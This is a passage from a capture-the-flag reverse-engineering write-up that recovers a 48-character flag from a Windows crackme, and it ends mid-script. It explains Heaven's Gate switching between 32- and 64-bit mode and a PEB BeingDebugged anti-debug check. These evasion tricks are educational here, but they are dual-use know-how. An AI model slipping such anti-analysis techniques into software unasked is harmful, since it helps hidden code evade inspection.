</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">cVar1</span> <span class="o">=</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">f</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">cVar1</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">f</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">argv1</span> <span class="o">!=</span> <span class="mi">48</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong length</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">in_stack_ffffffd8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p>So we already know that we need to pass the flag as argument and that this flag must be 48 characters.</p>
<p>What follows is a serie of calls, checking the flag characters one by one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">argv1</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_0040544c</span><span class="p">)(</span><span class="n">argv1</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">argv1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">argv1</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">argv1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0xc4</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_004053a8</span><span class="p">)(</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x16</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_004053b4</span><span class="p">)(</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x8e</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_004053f0</span><span class="p">)(</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_00405448</span><span class="p">)(</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_004053fc</span><span class="p">)(</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0xb9</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">        cut for brevity
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mh">0x2d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_0040540c</span><span class="p">)(</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0xf9</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">chr</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mh">0x2e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_004053f4</span><span class="p">)(</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">chr</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">chr</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x98</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">argv1</span> <span class="o">=</span> <span class="n">argv1</span> <span class="o">+</span> <span class="mh">0x2f</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">DAT_00405438</span><span class="p">)(</span><span class="n">argv1</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">argv1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="n">argv1</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">argv1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span><span class="mh">0x65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span></code></pre></div><p>Finally a <code>memcmp</code> call against a global array:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">iVar2</span> <span class="o">=</span> <span class="nf">memcmp</span><span class="p">(</span><span class="n">FLAG</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="n">iVar2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;I know you know the flag!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="kt">char</span><span class="p">)</span><span class="n">iVar2</span><span class="p">);</span>
</span></span></code></pre></div><p>The content of this array is, we can already save it for later:</p>
<pre tabindex="0"><code>                         FLAG                                                         XREF[1]:   main:00401c05(*)
      00405018 96 50 cf 2c eb 9b aa     db[48]
               fb 53 ab 73 dd 6c 9e
               db bc ee ab 23 d6 1
         00405018 [0]           96h, 50h, CFh, 2Ch,
         0040501c [4]           EBh, 9Bh, AAh, FBh,
         00405020 [8]           53h, ABh, 73h, DDh,
         00405024 [12]          6Ch, 9Eh, DBh, BCh,
         00405028 [16]          EEh, ABh, 23h, D6h,
         0040502c [20]          16h, FDh, F1h, F0h,
         00405030 [24]          B9h, 75h, C3h, 28h,
         00405034 [28]          A2h, 74h, 7Dh, E3h,
         00405038 [32]          27h, D5h, 95h, 5Ch,
         0040503c [36]          F5h, 76h, 75h, C9h,
         00405040 [40]          8Ch, FBh, 42h,  Eh,
         00405044 [44]          BDh, 51h, A2h, 98h
</code></pre><p>So we know what we need to find, we just have to reverse all the flag character check functions.</p>
<p>Each check is actually a call to a different function pointer and these pointers are initialized at runtime:</p>
<p><img src="func_pointers.png" alt="function pointer"></p>
<p>If we follow the XREF, we see that each of them are resolved by a serie of stub functions</p>
<pre tabindex="0"><code>                         DAT_004030cc                                                 XREF[1]:   entry:00401d92(*)
      004030cc 00                       ??                   00h
      004030cd 00                       ??                   00h
      004030ce 00                       ??                   00h
      004030cf 00                       ??                   00h
      004030d0 0e 1d 40 00              addr                 LAB_00401d0e
      004030d4 00 10 40 00              addr                 FUN_00401000
      004030d8 10 10 40 00              addr                 FUN_00401010
      004030dc 20 10 40 00              addr                 FUN_00401020
      004030e0 30 10 40 00              addr                 FUN_00401030
      004030e4 40 10 40 00              addr                 FUN_00401040
      004030e8 50 10 40 00              addr                 FUN_00401050
      004030ec 60 10 40 00              addr                 FUN_00401060
      004030f0 70 10 40 00              addr                 FUN_00401070
      004030f4 80 10 40 00              addr                 FUN_00401080
      004030f8 90 10 40 00              addr                 FUN_00401090
      004030fc a0 10 40 00              addr                 FUN_004010a0
      00403100 b0 10 40 00              addr                 FUN_004010b0
      00403104 c0 10 40 00              addr                 FUN_004010c0
      00403108 d0 10 40 00              addr                 FUN_004010d0
      0040310c e0 10 40 00              addr                 FUN_004010e0
      00403110 f0 10 40 00              addr                 FUN_004010f0
      00403114 00 11 40 00              addr                 FUN_00401100
      00403118 10 11 40 00              addr                 FUN_00401110
      0040311c 20 11 40 00              addr                 FUN_00401120
      00403120 30 11 40 00              addr                 FUN_00401130
      00403124 40 11 40 00              addr                 FUN_00401140
      00403128 50 11 40 00              addr                 FUN_00401150
      0040312c 60 11 40 00              addr                 FUN_00401160
      00403130 70 11 40 00              addr                 FUN_00401170
      00403134 80 11 40 00              addr                 FUN_00401180
      00403138 90 11 40 00              addr                 FUN_00401190
      0040313c a0 11 40 00              addr                 FUN_004011a0
      00403140 b0 11 40 00              addr                 FUN_004011b0
      00403144 c0 11 40 00              addr                 FUN_004011c0
      00403148 d0 11 40 00              addr                 FUN_004011d0
      0040314c e0 11 40 00              addr                 FUN_004011e0
      00403150 f0 11 40 00              addr                 FUN_004011f0
      00403154 00 12 40 00              addr                 FUN_00401200
      00403158 10 12 40 00              addr                 FUN_00401210
      0040315c 20 12 40 00              addr                 FUN_00401220
      00403160 30 12 40 00              addr                 FUN_00401230
      00403164 40 12 40 00              addr                 FUN_00401240
      00403168 50 12 40 00              addr                 FUN_00401250
      0040316c 60 12 40 00              addr                 FUN_00401260
      00403170 70 12 40 00              addr                 FUN_00401270
      00403174 80 12 40 00              addr                 FUN_00401280
      00403178 90 12 40 00              addr                 FUN_00401290
      0040317c a0 12 40 00              addr                 FUN_004012a0
      00403180 b0 12 40 00              addr                 FUN_004012b0
      00403184 c0 12 40 00              addr                 FUN_004012c0
      00403188 d0 12 40 00              addr                 FUN_004012d0
      0040318c e0 12 40 00              addr                 FUN_004012e0
      00403190 f0 12 40 00              addr                 FUN_004012f0
</code></pre><p>during the <code>_initterm()</code> call before the main invocation</p>
<pre tabindex="0"><code>      00401d92 68 cc 30 40 00           PUSH                 DAT_004030cc
      00401d97 e8 57 0a 00 00           CALL                 API-MS-WIN-CRT-RUNTIME-L1-1-0.DLL::_initterm                                             undefined _initterm()
</code></pre><h1 id="2-the-magic">2. The Magic</h1>
<p>Eeach stub looks the same, only initializing a different pointer with a different address:</p>
<p><img src="stub.png" alt="stub"></p>
<p>we can follow <em>code</em> and force disassembly to find something like:</p>
<p><img src="code.png" alt="code"></p>
<p>and this where the magic happen: the <code>RETF</code>instruction (RET <em>FAR</em>), will not only pop the EIP register but also the CS register.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">004031</span><span class="nf">c0</span>    <span class="no">PUSH</span>    <span class="mi">0x33</span>            <span class="c1">; push 0x33 to the stack
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">004031</span><span class="nf">c2</span>    <span class="no">CALL</span>    <span class="no">LAB_004031c7</span>    <span class="c1">; push return address to the stack (right after the call: 004031c7)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nl">LAB_004031c7:</span>
</span></span><span class="line"><span class="cl"><span class="err">004031</span><span class="nf">c7</span>    <span class="no">ADD</span>     <span class="p">[</span><span class="no">ESP</span><span class="p">],</span> <span class="mi">5</span>        <span class="c1">; increment saved return address by 5 (ADD is 4 bytes, RETF 1 bytes)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                    <span class="c1">; saved EIP is now 004031cc
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">004031</span><span class="nf">cb</span>    <span class="no">RETF</span>                    <span class="c1">; pop EIP from the stack (so EIP = 004031cc) and CS (0x33)
</span></span></span><span class="line"><span class="cl"><span class="c1">; continues execution
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">004031</span><span class="nf">cc</span>    <span class="err">??</span>
</span></span></code></pre></div><p>By putting 0x33 into CS, the processor switches to 64 bits mode, that&rsquo;s why ghidra is getting all confused after the RETF.</p>
<p>we can quickly disassemble the bytes using radare2 or rizin:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c1">; % rz-asm -b 64 -d 4831c065488b4060480fb64002678b4c241c67890185c07518678b7c2404678b74240c678b4c241467020e80f1ba67880fe800000000c7442404230000008304240dcbc3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">gs</span><span class="p">:[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x60</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movzx</span> <span class="no">rax</span><span class="p">,</span> <span class="no">byte</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0x1c</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">dword</span> <span class="p">[</span><span class="no">ecx</span><span class="p">],</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">test</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">jne</span> <span class="mi">0x31</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0xc</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0x14</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="no">cl</span><span class="p">,</span> <span class="no">byte</span> <span class="p">[</span><span class="no">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">cl</span><span class="p">,</span> <span class="mi">0xba</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">byte</span> <span class="p">[</span><span class="no">edi</span><span class="p">],</span> <span class="no">cl</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span> <span class="mi">0x36</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">4</span><span class="p">],</span> <span class="mi">0x23</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rsp</span><span class="p">],</span> <span class="mi">0xd</span>
</span></span><span class="line"><span class="cl"><span class="nf">retf</span>
</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
</span></span></code></pre></div><p>this piece of code starts with some anti debug:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span> 
</span></span><span class="line"><span class="cl"><span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">gs</span><span class="p">:[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">0x60</span><span class="p">]</span>      <span class="c1">; PEB
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">movzx</span> <span class="no">rax</span><span class="p">,</span> <span class="no">byte</span> <span class="p">[</span><span class="no">rax</span> <span class="err">+</span> <span class="mi">2</span><span class="p">]</span>           <span class="c1">; PEB-&gt;BeingDebugged
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0x1c</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">dword</span> <span class="p">[</span><span class="no">ecx</span><span class="p">],</span> <span class="no">eax</span> 
</span></span><span class="line"><span class="cl"><span class="no">test</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span> 
</span></span><span class="line"><span class="cl"><span class="no">jne</span> <span class="mi">0x31</span>
</span></span></code></pre></div><p>It check <code>PEB-&gt;BeingDebugged</code>  for the presence of a debugger and skips the rest if found.</p>
<p>More info on the TEB/PEB here:</p>
<ul>
<li><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/teb/index.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/teb/index.htm</a></li>
<li><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm</a></li>
</ul>
<p>Then it manipulates the flag character it&rsquo;s checking:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">4</span><span class="p">]</span>        <span class="c1">; ptr to the character we&#39;re checking in argv[1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0xc</span><span class="p">]</span>      <span class="c1">; same as above
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">dword</span> <span class="p">[</span><span class="no">esp</span> <span class="err">+</span> <span class="mi">0x14</span><span class="p">]</span>     <span class="c1">; ptr to some constant passed during the call - let&#39;s call the value V
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">add</span> <span class="no">cl</span><span class="p">,</span> <span class="no">byte</span> <span class="p">[</span><span class="no">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span> <span class="no">cl</span><span class="p">,</span> <span class="mi">0xba</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">byte</span> <span class="p">[</span><span class="no">edi</span><span class="p">],</span> <span class="no">cl</span>
</span></span></code></pre></div><p>The stack layout was dumped using a debugger before the CPU switches to 64 bits mode (and makes the debugger go banana), and this piece of code is doing:</p>
<pre tabindex="0"><code>argv[1][0] = (argv[1][0] + V) ^ 0xba
</code></pre><p>we can get the value <em>V</em> (0xc4 in this case) from the function call in main:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">    <span class="n">argv1</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">*</span><span class="n">function_ptr</span><span class="p">)(</span><span class="n">argv1</span> <span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">argv1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span> <span class="p">,</span>  <span class="n">argv1</span>  <span class="p">,</span>  <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">argv1</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">,</span>  <span class="mh">0xc4</span>   <span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_10</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_10</span> <span class="o">&gt;&gt;</span> <span class="mh">0x1f</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                                                           <span class="o">-----&gt;</span>  <span class="n">V</span>
</span></span><span class="line"><span class="cl">            <span class="n">ESP</span>      <span class="o">+</span><span class="mi">4</span>   <span class="p">,</span>         <span class="o">+</span><span class="mi">8</span>         <span class="p">,</span>  <span class="o">+</span><span class="mh">0xc</span>   <span class="p">,</span>      <span class="o">+</span><span class="mh">0x10</span>         <span class="p">,</span>  <span class="o">+</span><span class="mh">0x14</span>  <span class="p">,</span> <span class="p">.....</span>              
</span></span></code></pre></div><p>The last bit of code is responsible for switching back to 32 bits mode, this time by setting CS to 0x23:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">call</span> <span class="mi">0x36</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rsp</span> <span class="err">+</span> <span class="mi">4</span><span class="p">],</span> <span class="mi">0x23</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="no">dword</span> <span class="p">[</span><span class="no">rsp</span><span class="p">],</span> <span class="mi">0xd</span>
</span></span><span class="line"><span class="cl"><span class="nf">retf</span>
</span></span></code></pre></div><p>Alright so here we know that:</p>
<pre tabindex="0"><code>argv[1][0] = (argv[1][0] + 0xc4) ^ 0xba
</code></pre><p>and that is should be equal to 0x96 (first byte of the memcmp&rsquo;d array)</p>
<p>which means the firt character of the flag must be <code>h</code> (even though we already know that because flags are like hitcon{&hellip;.}):</p>
<pre tabindex="0"><code>&gt;&gt;&gt; chr((0x96 ^ 0xba) - 0xc4 &amp; 0xff)
&#39;h&#39;
</code></pre><p>At least the track seems solid&hellip;</p>
<h1 id="3-rinse-and-repeat">3. Rinse and Repeat</h1>
<p>48 characters, 48 different functions, time to go dirty.</p>
<p>I&rsquo;ve noticed 2 interesting properties:</p>
<ul>
<li>the flag char check functions are in the correct &ldquo;memory order&rdquo; (meaning that the function checking chr 2 is at a higher address than the one checking chr 1, and the one checking chr 3 is at a higher address than the one checking chr 2, etc..)</li>
<li>these functions always start/end with the same byte sequence</li>
</ul>
<p>which make a good and simple &ldquo;automation&rdquo; case.</p>
<p>The start byte sequence is <code>\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb</code>, the end byte sequence is <code>\xcb\x3c</code> (RETF; RET)</p>
<p><img src="prologue.png" alt="prologue"></p>
<p>using the following script we can disassemble all the functions we need:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">capstone</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">md</span> <span class="o">=</span> <span class="n">Cs</span><span class="p">(</span><span class="n">CS_ARCH_X86</span><span class="p">,</span> <span class="n">CS_MODE_64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">md</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">):</span>
